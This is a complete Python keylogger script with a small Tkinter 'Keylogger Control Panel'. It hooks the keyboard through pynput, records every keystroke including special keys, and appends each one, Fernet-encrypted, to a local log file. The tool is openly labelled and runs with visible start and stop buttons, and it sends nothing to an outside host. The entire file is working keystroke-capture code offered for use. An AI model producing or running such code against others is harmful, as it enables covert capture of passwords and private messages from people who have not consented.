import os
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

# ==========================
# Encryption Setup
# ==========================

# Generate a key (do this only once and save the key for later use)
key_path = "encryption.key"
if not os.path.exists(key_path):
    with open(key_path, "wb") as key_file:
        key = Fernet.generate_key()
        key_file.write(key)
else:
    with open(key_path, "rb") as key_file:
        key = key_file.read()

cipher = Fernet(key)

# File to save encrypted logs
log_file = "encrypted_key_log.txt"

# ==========================
# Keylogger Functions
# ==========================

def encrypt_and_save_log(data):
    """Encrypts and saves logged data to a file."""
    encrypted_data = cipher.encrypt(data.encode())
    with open(log_file, "ab") as file:  # Append encrypted data
        file.write(encrypted_data + b"\n")

def on_press(key):
    """Handle key press events."""
    try:
        # Record alphanumeric keys
        key_data = key.char
    except AttributeError:
        # Handle special keys like Enter, Space, etc.
        key_data = f"[{key}]"

    encrypt_and_save_log(key_data)

def on_release(key):
    """Handle key release events."""
    if key == Key.esc:
        # Stop listener when ESC is pressed
        return False

# ==========================
# GUI for Control
# ==========================

def start_keylogger():
    """Starts the keylogger."""
    messagebox.showinfo("Keylogger", "Keylogger started! Press 'ESC' to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def stop_keylogger():
    """Stops the keylogger."""
    messagebox.showinfo("Keylogger", "Keylogger stopped!")
    root.destroy()

# ==========================
# GUI Setup
# ==========================

# Create the main GUI window
root = tk.Tk()
root.title("Keylogger Control Panel")
root.geometry("300x200")

# Instructions Label
tk.Label(root, text="Keylogger Control", font=("Arial", 16)).pack(pady=10)

# Start Button
start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger, bg="green", fg="white", font=("Arial", 12))
start_button.pack(pady=10)

# Stop Button
stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, bg="red", fg="white", font=("Arial", 12))
stop_button.pack(pady=10)

# Run the GUI event loop
root.mainloop()
